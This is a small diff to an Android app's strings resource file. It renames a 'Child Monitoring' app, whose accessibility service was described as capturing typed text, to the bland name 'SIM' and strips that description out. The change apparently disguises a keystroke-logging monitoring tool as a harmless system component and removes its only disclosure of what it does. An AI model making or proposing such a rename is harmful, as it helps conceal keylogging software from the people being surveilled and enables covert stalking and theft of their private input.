@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
 <resources>
-    <string name="accessibility_service_desc">Child Monitoring - Captures typed text for parental monitoring.</string>
-    <string name="app_name">Child Monitoring</string>
+    <string name="accessibility_service_desc">SIM</string>
+    <string name="app_name">SIM</string>
 </resources>
